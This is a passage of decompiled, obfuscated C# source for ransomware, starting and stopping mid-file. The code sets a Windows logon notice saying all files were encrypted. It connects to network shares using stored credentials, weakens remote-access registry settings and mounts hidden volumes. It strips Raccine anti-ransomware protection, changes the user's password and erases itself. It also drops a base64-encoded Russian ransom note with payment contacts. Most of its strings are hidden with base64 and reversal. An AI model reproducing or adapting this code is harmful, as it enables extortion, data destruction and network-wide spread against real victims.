				FileName = XMYfRqQvHEQq,
				Arguments = eegtHWxTJETuDh,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void ICvwPzGGqyQhqi(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string IPHxEYiEhccEgJV(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string oMKRHTBqYRfOk(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void zyckfWuwOlSm(string CaiYvtfKfPGICRJt = "", string vNzUIfnljpgMP = "SW5mb3JtYXRpb24uLi4=", string QUTncpMKdTgjxKB = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		CaiYvtfKfPGICRJt = IPHxEYiEhccEgJV("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(CaiYvtfKfPGICRJt), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(oMKRHTBqYRfOk("TGVnYWxOb3RpY2VDYXB0aW9u"), oMKRHTBqYRfOk(vNzUIfnljpgMP));
				registryKey.SetValue(oMKRHTBqYRfOk("TGVnYWxOb3RpY2VUZXh0"), oMKRHTBqYRfOk(QUTncpMKdTgjxKB));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			CaiYvtfKfPGICRJt = IPHxEYiEhccEgJV("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(CaiYvtfKfPGICRJt), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(oMKRHTBqYRfOk("bGVnYWxub3RpY2VjYXB0aW9u"), oMKRHTBqYRfOk(vNzUIfnljpgMP));
				registryKey.SetValue(oMKRHTBqYRfOk("bGVnYWxub3RpY2V0ZXh0"), oMKRHTBqYRfOk(QUTncpMKdTgjxKB));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void bIoyQTORDlN()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (EMkDRelwWGZ == "YES" && !string.IsNullOrEmpty(EhKqkDBbta) && !string.IsNullOrEmpty(hXdhfhCZQZwsD))
				{
					zyckfWuwOlSm("", EhKqkDBbta, hXdhfhCZQZwsD);
				}
				else
				{
					zyckfWuwOlSm();
				}
			}
		}
		catch
		{
		}
	}

	public static void avpYLdZBuA(string POKtYIiJXMjwxKG = "SW5mb3JtYXRpb24uLi4=", string gcqDNlizCVsp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(oMKRHTBqYRfOk(POKtYIiJXMjwxKG));
		val.set_BalloonTipText(oMKRHTBqYRfOk(gcqDNlizCVsp));
		val.ShowBalloonTip(30000);
	}

	public static void dMZRilCNEznH(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		uATAppcKlZ("net.exe", "user " + text + " " + string_0);
	}

	private static void qBOJnbpOcHbwx()
	{
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045c: Expected O, but got Unknown
		//IL_0477: Unknown result type (might be due to invalid IL or missing references)
		//IL_047e: Expected O, but got Unknown
		kRQDUzryMSl.XWEwnDcFAIe();
		XcEEPGrLNtid = kRQDUzryMSl.kyKQHCEMhl();
		List<lVcAopDuxvDO> list = lVcAopDuxvDO.zyEAzUDHaOZgE();
		foreach (lVcAopDuxvDO item in list)
		{
			UfvFMUrtpRxlu.Add(item.IPAddress);
		}
		YTTlQKYVEhwWmOpJ = XcEEPGrLNtid.Union(UfvFMUrtpRxlu).ToList();
		foreach (string item2 in YTTlQKYVEhwWmOpJ)
		{
			if ((!item2.StartsWith("10.") && !item2.StartsWith("172.") && !item2.StartsWith("192.168.") && !item2.StartsWith("")) || !kRQDUzryMSl.WxuDleZZaODM(item2))
			{
				continue;
			}
			try
			{
				if (vJXCvrLeIURfhG == "YES")
				{
					for (int i = 0; i < kRQDUzryMSl.mjecbWlMAxoHXA.Count; i++)
					{
						uATAppcKlZ("net.exe", "use \\\\" + item2 + " /USER:" + kRQDUzryMSl.mjecbWlMAxoHXA[i] + " " + kRQDUzryMSl.iECfpnwmQTyE[i]);
					}
				}
				else
				{
					uATAppcKlZ("net.exe", "use \\\\" + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			kRQDUzryMSl.HOhoFavvjFpw hOhoFavvjFpw = new kRQDUzryMSl.HOhoFavvjFpw(kRQDUzryMSl.BngWFrPEMFij.vfRRmLmIxNWz, kRQDUzryMSl.YGmqXvJtDkEy.cRUwukJbtGBZtLW, kRQDUzryMSl.PxcrKvhDXsA.qsCJHFLrVdxx, kRQDUzryMSl.OcMOKzcsaQRkpAXu.WOYBMlKmNta);
			foreach (string item3 in hOhoFavvjFpw)
			{
				MatchCollection matchCollection = Regex.Matches(item3, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}");
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (vJXCvrLeIURfhG == "YES")
						{
							for (int j = 0; j < kRQDUzryMSl.mjecbWlMAxoHXA.Count; j++)
							{
								uATAppcKlZ("net.exe", "use " + item4.ToString() + " /USER:" + kRQDUzryMSl.mjecbWlMAxoHXA[j] + " " + kRQDUzryMSl.iECfpnwmQTyE[j]);
							}
						}
						else
						{
							uATAppcKlZ("net.exe", "use " + item4.ToString());
						}
					}
					catch
					{
					}
					if (!nMCOBGfKnYn.Contains(item4.ToString()))
					{
						nMCOBGfKnYn.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = IPHxEYiEhccEgJV("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(oMKRHTBqYRfOk("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(oMKRHTBqYRfOk("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (CpuCxDkASAKU == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
				File.WriteAllText(text, oMKRHTBqYRfOk("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				uATAppcKlZ("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!nMCOBGfKnYn.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					nMCOBGfKnYn.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", "") + "Users");
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool oTRBkZZrvG()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void EnvRhAFwnNeKeW(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = oMKRHTBqYRfOk("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool NHrsaNbqqwFFKh(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool AamQmrXSkACS(string string_0)
	{
		try
		{
			WYVxZrhpKQNU CS_0024_003C_003E8__locals0 = new WYVxZrhpKQNU();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.uAYBqoxFKKpTW = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.uAYBqoxFKKpTW);
			return driveInfo != null && driveInfo.DriveFormat == "NTFS";
		}
		catch
		{
			return false;
		}
	}

	public static string DhkyAUdEoqAPuutg(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void aAebNXDYZjDhw()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = IPHxEYiEhccEgJV("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("d21pYy5leGU="));
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				string_ = IPHxEYiEhccEgJV("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("UmFjY2luZQ=="));
					registryKey.Close();
				}
				string_ = IPHxEYiEhccEgJV("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("UmFjY2luZQ=="));
					registryKey.Close();
				}
				string_ = IPHxEYiEhccEgJV("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(oMKRHTBqYRfOk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(oMKRHTBqYRfOk("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGw="), oMKRHTBqYRfOk("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			uATAppcKlZ(oMKRHTBqYRfOk("cmVn"), oMKRHTBqYRfOk("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			uATAppcKlZ(oMKRHTBqYRfOk("cmVn"), oMKRHTBqYRfOk("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			uATAppcKlZ(oMKRHTBqYRfOk("c2NodGFza3M="), oMKRHTBqYRfOk("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void lPoyIxkPQfSfzaP(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(oMKRHTBqYRfOk("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void esQslEvKNI()
	{
		string string_ = IPHxEYiEhccEgJV("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(oMKRHTBqYRfOk(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(oMKRHTBqYRfOk("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void PNdHksrWsNzLSUd()
	{
		uATAppcKlZ("cmd.exe", oMKRHTBqYRfOk("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = oMKRHTBqYRfOk("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void eIGoCSnmXvMXP(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(OpWBXzCwVRYsxq, "File: " + string_0 + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string OLRxBoNESYHA()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string WEEGseTDeH(string string_0)
	{
		string text = Path.GetTempPath() + "\\????????????????????.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(oMKRHTBqYRfOk("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyaXR5ODQ5QG51a2UuYWZyaWNhDQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCtCS0JDQltCd0J4hINCd0LUg0L/QuNGI0LjRgtC1INGBIG1haWwucnUgKNC6INC90LDQvCDQvdC1INC00L7RhdC+0LTRj9GCINC/0LjRjNGB0LzQsCkg0JjRgdC/0L7Qu9GM0LfRg9C50YLQtSAtIHlhbmRleC5ydSBnbWFpbC5jb20g0Lgg0YIu0LQuIA0K0JLRgdC1INC60YDQvtC80LUgbWFpbC5ydQ0KDQogLdCn0LXQvCDQsdGL0YHRgtGA0LXQtSDQstGLINGB0L7QvtCx0YnQuNGC0LUg0L3QsNC8INGB0LLQvtC5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGALCDRgtC10Lwg0LHRi9GB0YLRgNC10LUg0LzRiyDQstGL0LrQu9GO0YfQuNC8INC/0YDQvtC40LfQstC+0LvRjNC90L7QtSDRg9C00LDQu9C10L3QuNC1INGE0LDQudC70L7Qsi4NCiAt0J3QsNC/0LjRgdCw0LIg0L3QsNC8INC90LAg0L/QvtGH0YLRgyDQstGLINC/0L7Qu9GD0YfQuNGC0LUg0LTQsNC70YzQvdC10LnRiNC40LUg0LjQvdGB0YLRgNGD0LrRhtC40Lgg0L/QviDQvtC/0LvQsNGC0LUuDQoNCtCSINC+0YLQstC10YLQvdC+0Lwg0L/QuNGB0YzQvNC1INCS0Ysg0L/QvtC70YPRh9C40YLQtSDQv9GA0L7Qs9GA0LDQvNC80YMg0LTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60LguDQrQn9C+0YHQu9C1INC30LDQv9GD0YHQutCwINC/0YDQvtCz0YDQsNC80LzRiy3QtNC10YjQuNGE0YDQvtCy0YnQuNC60LAg0LLRgdC1INCS0LDRiNC4INGE0LDQudC70Ysg0LHRg9C00YPRgiDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3Riy4NCg0K0JzRiyDQs9Cw0YDQsNC90YLQuNGA0YPQtdC8Og0KMTAwJSDRg9GB0L/QtdGI0L3QvtC1INCy0L7RgdGB0YLQsNC90L7QstC70LXQvdC40LUg0LLRgdC10YUg0LLQsNGI0LjRhSDRhNCw0LnQu9C+0LINCjEwMCUg0LPQsNGA0LDQvdGC0LjRjiDRgdC+0L7RgtCy0LXRgtGB0YLQstC40Y8NCjEwMCUg0LHQtdC30L7Qv9Cw0YHQvdGL0Lkg0Lgg0L3QsNC00LXQttC90YvQuSDRgdC10YDQstC40YENCtCS0L3QuNC80LDQvdC40LUhDQogKiDQndC1INC/0YvRgtCw0LnRgtC10YHRjCDRg9C00LDQu9C40YLRjCDQv9GA0L7Qs9GA0LDQvNC80YMg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjCDQsNC90YLQuNCy0LjRgNGD0YHQvdGL0LUg0YHRgNC10LTRgdGC0LLQsA0KICog0J/QvtC/0YvRgtC60Lgg0YHQsNC80L7RgdGC0L7Rj9GC0LXQu9GM0L3QvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0YTQsNC50LvQvtCyINC/0YDQuNCy0LXQtNGD0YIg0Log0L/QvtGC0LXRgNC1INCS0LDRiNC40YUg0LTQsNC90L3Ri9GFDQogKiDQlNC10YjQuNGE0YDQsNGC0L7RgNGLINC00YDRg9Cz0LjRhSDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSDQvdC10YHQvtCy0LzQtdGB0YLQuNC80Ysg0YEg0JLQsNGI0LjQvNC4INC00LDQvdC90YvQvNC4LCDRgtCw0Log0LrQsNC6INGDINC60LDQttC00L7Qs9C+INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjw0K0YPQvdC40LrQsNC70YzQvdGL0Lkg0LrQu9GO0Ycg0YjQuNGE0YDQvtCy0LDQvdC40Y8NCg0KDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YPQtNCw0LvRj9GO0YLRgdGPIDI0INGE0LDQudC70LAsINC90LXQvtCx0YXQvtC00LjQvNC+INC/0YDQuNGB0LvQsNGC0Ywg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAg0YfRgtC+0LEg0LzRiyDQvtGC0LrQu9GO0YfQuNC70Lgg0Y3RgtGDINGE0YPQvdC60YbQuNGOLg0K0JrQsNC20LTRi9C1IDI0INGH0LDRgdCwINGB0YLQvtC40LzQvtGB0YLRjCDRgNCw0YHRiNC40YTRgNC+0LLQutC4INC00LDQvdC90YvRhSDRg9Cy0LXQu9C40YfQuNCy0LDQtdGC0YHRjyDQvdCwIDMwJSAo0YfQtdGA0LXQtyA3MiDRh9Cw0YHQsCDRgdGD0LzQvNCwINGE0LjQutGB0LjRgNGD0LXRgtGB0Y8pDQoNCg0KUC5TDQrQldGB0LvQuCDQktCw0Lwg0L3QtSDQvtGC0LLQtdGC0LjQu9C4INCyINGC0LXRh9C10L3QuNC4IDQ4INGH0LDRgdC+0LIuINCS0LDQvCDQvdGD0LbQvdC+INCx0YPQtNC10YIg0YHQstGP0LfQsNGC0YzRgdGPINGBINC90LDQvNC4INC/0L4g0LTQvtC/0L7Qu9C90LjRgtC10LvRjNC90YvQvCDQutC+0L3RgtCw0LrRgtCw0LwuIA0KDQrQodC60LDRh9Cw0LnRgtC1INC4INGD0YHRgtCw0L3QvtCy0LjRgtC1IFRvciBCcm93c2VyIC0gaHR0cHM6Ly93d3cudG9ycHJvamVjdC5vcmcvcnUvZG93bmxvYWQvDQrQntGC0LrRgNC+0LnRgtC1INGH0LXRgNC10LcgVG9yIEJyb3dzZXIg0YHQsNC50YIgLSBodHRwOi8vc29uYXJtc25pa28ybHZmdS5vbmlvbiAgICjRgdCw0LnRgiDQvdC1INCx0YPQtNC10YIg0YDQsNCx0L7RgtCw0YLRjCDRh9C10YDQtdC3INC+0LHRi9GH0L3Ri9C5INCx0YDQsNGD0LfQtdGALCDRgtC+0LvRjNC60L4g0YfQtdGA0LXQtyDQotCe0KApDQrQl9Cw0YDQtdCz0LjRgdGC0YDQuNGA0YPQudGC0LXRgdGMINC4INC90LDQv9C40YjQuNGC0LUg0L3QsNC8LiANCg0KKtCd0LDRiCDQvdC40Log0LIgU29uYXInZSAtIHNhdmVmaWxlMzY1"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(oMKRHTBqYRfOk("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(OpWBXzCwVRYsxq, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void SPaVkRNulTSot(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		HKEvdbLCkKIV.NkspxIhkZAcghDC CS_0024_003C_003E8__locals0 = new HKEvdbLCkKIV();
		CS_0024_003C_003E8__locals0.wvBPXomTVGYyo = string_1;
		CS_0024_003C_003E8__locals0.ZxnwAJqsazOQUB = string_2;
		CS_0024_003C_003E8__locals0.PzYMtvwFVOWwOfS = string_3;
		CS_0024_003C_003E8__locals0.jhLgXzNXSRNS = string_4;
		vzfvEbaMMJjzL = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.PzYMtvwFVOWwOfS);
		DriveInfo[] array = null;
		if (string_0[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
